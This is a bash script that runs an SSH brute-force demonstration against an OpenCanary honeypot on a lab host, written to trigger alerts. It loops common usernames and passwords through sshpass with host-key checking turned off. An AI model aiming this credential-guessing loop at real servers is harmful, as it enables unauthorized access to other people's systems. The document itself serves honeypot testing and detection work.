#!/bin/bash

# SSH Brute Force Demo Script
# Purpose: Demonstrate SSH attacks that trigger OpenCanary alerts

TARGET_IP="labpi3.local"
SSH_PORT="2222"  # OpenCanary SSH honeypot port
LOGFILE="/tmp/ssh_demo.log"

echo "Starting SSH brute force demonstration against $TARGET_IP:$SSH_PORT"
echo "This will trigger OpenCanary SSH honeypot alerts"

# Common username/password combinations for demo
USERNAMES=("admin" "root" "pi" "user" "test")
PASSWORDS=("password" "123456" "admin" "root" "pi")

echo "[$(date)] Beginning SSH brute force simulation..." | tee -a $LOGFILE

for username in "${USERNAMES[@]}"; do
    for password in "${PASSWORDS[@]}"; do
        echo "[$(date)] Trying $username:$password" | tee -a $LOGFILE
        
        # Use sshpass for automated password attempts
        # This will fail but trigger honeypot alerts
        timeout 5 sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$username@$TARGET_IP" -p $SSH_PORT exit 2>/dev/null
        
        # Small delay between attempts
        sleep 1
    done
done

echo "[$(date)] SSH brute force demo complete - check OpenCanary logs for alerts" | tee -a $LOGFILE